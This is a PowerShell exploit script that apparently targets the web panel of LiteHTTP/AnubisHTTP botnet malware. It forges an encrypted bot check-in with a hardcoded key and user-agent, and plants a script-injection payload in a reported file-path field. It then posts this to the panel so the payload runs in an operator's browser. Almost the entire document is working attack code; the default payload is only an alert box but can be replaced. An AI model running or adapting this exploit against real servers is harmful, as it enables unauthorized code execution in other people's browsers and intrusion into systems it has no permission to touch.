###############################################
#           LiteHTTP/AnubisHTTP XSS           #
#              github.com/01Xyris             #
###############################################

param(
    [string]$key = "9vFEwkyHsE84Q824NCDWs6dIyvzomQMI",
    [string]$url = "https://example.com/api",
    [string]$userAgent = "E9BC3BD76216AFA560BFB5ACAF5731A3",
    [string]$xssPayload = '<script>alert("meow")</script>'
)

function Generate-RandomID([int]$length = 64) {
    -join ((65..90) | ForEach-Object { [char]$_ } | Get-Random -Count $length)
}

function Encrypt-Text([string]$text, [string]$key) {
    try {
        $rj = New-Object System.Security.Cryptography.RijndaelManaged
        $rj.Padding, $rj.Mode, $rj.KeySize, $rj.BlockSize = [System.Security.Cryptography.PaddingMode]::Zeros, [System.Security.Cryptography.CipherMode]::CBC, 256, 256
        $rj.Key = $rj.IV = [System.Text.Encoding]::ASCII.GetBytes($key)
        return [Convert]::ToBase64String($rj.CreateEncryptor().TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($text), 0, $text.Length)).Replace("+", "~")
    } catch { Write-Host "Encryption failed" -ForegroundColor Red; return $null }
}

function Decrypt-Text([string]$text, [string]$key) {
    try {
        $rj = New-Object System.Security.Cryptography.RijndaelManaged
        $rj.Padding, $rj.Mode, $rj.KeySize, $rj.BlockSize = [System.Security.Cryptography.PaddingMode]::Zeros, [System.Security.Cryptography.CipherMode]::CBC, 256, 256
        $rj.Key = $rj.IV = [System.Text.Encoding]::ASCII.GetBytes($key)
        return ([System.Text.Encoding]::UTF8.GetString($rj.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($text.Replace("~", "+")), 0, [Convert]::FromBase64String($text.Replace("~", "+")).Length))).Trim() -replace "`0",""
    } catch { Write-Host "Decryption failed" -ForegroundColor Red; return $null }
}

function Send-WebRequest([string]$url, [string]$parameters, [string]$userAgent) {
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($parameters)
        $webRequest = [System.Net.HttpWebRequest]::Create($url)
        $webRequest.Method, $webRequest.ContentType, $webRequest.ContentLength, $webRequest.UserAgent, $webRequest.Host = "POST", "application/x-www-form-urlencoded", $bytes.Length, $userAgent, (New-Object Uri($url)).Host
        ($webRequestStream = $webRequest.GetRequestStream()).Write($bytes, 0, $bytes.Length)
        $webRequestStream.Close()
        return (New-Object System.IO.StreamReader(($response = $webRequest.GetResponse()).GetResponseStream())).ReadToEnd()
    } catch { Write-Host "Request failed: $($_.Exception.Message)" -ForegroundColor Red; return $null }
}

$data = @{
    id = Generate-RandomID; os = "Microsoft Windows 10 Pro x64"; pv = "User"
    ip = "C:\Users\admin\Desktop\e201e9a5c9fd3a68f54e2ada061a242df3ed813e56d2b09e2c8efc04953c2f72.exe$xssPayload"
    cn = "DESKTOP-JGLLJLD"; lr = "17 minute(s) ago"; ct = "0"; bv = "v1.0.4"
}

Write-Host "===== Encryption Process =====" -ForegroundColor Cyan
$encryptedParams = @{}
foreach ($k in $data.Keys) {
    $encryptedParams[$k] = Encrypt-Text $data[$k] $key
    Write-Host "`nParameter: $k" -ForegroundColor Yellow
    Write-Host "Original: $($data[$k])" -ForegroundColor Green
    Write-Host "Encrypted: $($encryptedParams[$k])" -ForegroundColor Green
    $decrypted = Decrypt-Text $encryptedParams[$k] $key
    Write-Host "Decrypted: $decrypted" -ForegroundColor Green
    if ($data[$k] -eq $decrypted) {
        Write-Host "Decryption Test: PASS" -ForegroundColor Green
    } else {
        Write-Host "Decryption Test: FAIL" -ForegroundColor Red
    }
}

Write-Host "`n===== Sending Request =====" -ForegroundColor Cyan
$postData = ($encryptedParams.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join "&"
Write-Host $postData -ForegroundColor Magenta

Write-Host "`n===== Response =====" -ForegroundColor Cyan
$response = Send-WebRequest $url $postData $userAgent
Write-Host $response -ForegroundColor Magenta

Read-Host "`nPress Enter to exit"